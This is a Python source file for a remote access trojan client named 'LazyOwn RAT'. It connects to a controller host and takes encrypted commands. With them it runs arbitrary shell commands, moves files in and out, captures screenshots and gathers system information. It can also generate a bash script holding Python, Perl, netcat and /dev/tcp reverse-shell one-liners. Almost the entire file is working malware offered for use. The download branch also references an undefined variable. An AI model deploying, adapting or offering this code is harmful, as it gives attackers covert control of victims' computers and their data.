#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import socket
import signal
import argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import binascii
import subprocess
import platform
import base64
def signal_handler(sig, frame):
    global should_exit
    print("\n [<-] Saliendo...")
    should_exit = True

signal.signal(signal.SIGINT, signal_handler)

try:
    from PIL import ImageGrab
    screenshot_available = True
except (ImportError, OSError) as e:
    screenshot_available = False
    print(f"[-] Screenshot functionality is not available: {e}")

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(plaintext, key):
    plaintext = pad(plaintext)
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')

def handle_command(cmd, key):
    if cmd.startswith('upload'):
        _, filename = cmd.split(' ', 1)
        upload_path = os.path.join('upload', filename)
        with open(upload_path, 'rb') as f:
            data = f.read()
        return data

    elif cmd.startswith('download'):
        _, filename = cmd.split(' ', 1)
        download_path = os.path.join('download', filename)
        if not os.path.exists('download'):
            os.makedirs('download')
        with open(download_path, 'wb') as f:
            f.write(decrypt(base64.b64decode(data), key))
        return f'{download_path} downloaded successfully'

    elif cmd == 'screenshot' and screenshot_available:
        screenshot = ImageGrab.grab()
        screenshot.save('screenshot.png')
        with open('screenshot.png', 'rb') as f:
            data = f.read()
        os.remove('screenshot.png')
        return data

    elif cmd == 'sysinfo':
        info = f'System: {platform.system()}\n'
        info += f'Node Name: {platform.node()}\n'
        info += f'Release: {platform.release()}\n'
        info += f'Version: {platform.version()}\n'
        info += f'Machine: {platform.machine()}\n'
        info += f'Processor: {platform.processor()}\n'
        return info

    elif cmd.startswith('lazyownreverse'):
        _, ip, port = cmd.split(' ')
        script_content = f"""#!/bin/bash

echo "██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗"
echo "██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║"
echo "██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║"
echo "██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║"
echo "███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║"
echo "╚══════╝╚═╝  ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝"

function mostrar_ayuda {{
    echo "Uso: $0 --ip IP --puerto PUERTO"
    echo ""
    echo "Opciones:"
    echo "  --ip       IP del servidor de escucha"
    echo "  --puerto   Puerto del servidor de escucha"
    exit 1
}}

function validar_ip {{
    local ip=$1
    local valid_regex='^([0-9]{1,3}\\.){{3}}[0-9]{1,3}$'
    if [[ $ip =~ $valid_regex ]]; then
        for segment in $(echo $ip | tr "." "\\n"); do
            if ((segment < 0 || segment > 255)); then
                return 1
            fi
        done
        return 0
    else
        return 1
    fi
}}

if [[ $# -lt 4 ]]; then
    mostrar_ayuda
fi

while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)
            IP="$2"
            if ! validar_ip "$IP"; then
                echo "[-] IP inválida: $IP"
                exit 1
            fi
            shift 2
            ;;
        --puerto)
            PUERTO="$2"
            if ! [[ $PUERTO =~ ^[0-9]+$ ]] || (( PUERTO < 1 || PUERTO > 65535 )); then
                echo "[-] Puerto inválido: $PUERTO"
                exit 1
            fi
            shift 2
            ;;
        *)
            mostrar_ayuda
            ;;
    esac
done

echo "[+] Intentando reverse shell en Python..."
if command -v python > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en python"
    python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('$IP',$PUERTO)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(['/bin/sh','-i']);" && exit
fi

echo "[+] Intentando reverse shell en Perl..."
if command -v perl > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en perl"
    perl -e 'use Socket;$i="$IP";$p=$PUERTO;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' && exit
fi

echo "[+] Intentando reverse shell en Netcat..."
if command -v nc > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en nc"
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PUERTO > /tmp/f && exit
fi

echo "[+] Intentando reverse shell en Shell..."
if command -v sh > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en sh"
    /bin/sh -i >& /dev/tcp/$IP/$PUERTO 0>&1 && exit
fi

echo "[-] No se pudo establecer una conexión reverse shell con ninguna de las herramientas disponibles."
"""
        return script_content

    else:
        return subprocess.check_output(cmd, shell=True)

def main():
    BANNER = """
    ██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
    ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
    ██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
    ██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
    ███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
    ╚══════╝╚═╝  ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
    [*] Iniciando: LazyOwn RAT [;,;]
    """    
    print(BANNER)    
    parser = argparse.ArgumentParser(description='LazyOwnRAT Client')
    parser.add_argument('--host', required=True, help='Server host to connect to')
    parser.add_argument('--port', type=int, required=True, help='Server port to connect to')
    parser.add_argument('--key', required=True, help='Encryption key (hex encoded)')
    args = parser.parse_args()

    HOST = args.host
    PORT = args.port
    KEY = binascii.unhexlify(args.key)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print(f'[x] Conectado a {HOST}:{PORT}')

    try:
        while True:
            data = s.recv(4096)
            if not data:
                break

            cmd = decrypt(data, KEY).decode('utf-8')
            if cmd == 'quit':
                break

            result = handle_command(cmd, KEY)
            if isinstance(result, bytes):
                s.sendall(encrypt(result, KEY))
            else:
                s.sendall(encrypt(result.encode('utf-8'), KEY))

    except Exception as e:
        print(f'[e] Error: {e}')
    finally:
        s.close()

if __name__ == '__main__':
    main()
